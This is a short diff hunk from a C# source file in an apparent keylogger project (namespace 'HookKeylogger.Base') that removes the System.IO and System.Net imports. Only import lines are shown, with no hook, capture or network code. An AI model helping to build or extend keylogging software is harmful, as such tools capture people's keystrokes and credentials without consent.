@@ -1,8 +1,6 @@
 ﻿using System;
 using HookKeylogger.Base;
-using System.IO;
 using System.Windows.Forms;
-using System.Net;
 using System.Net.Sockets;
 using Google.Protobuf;
 
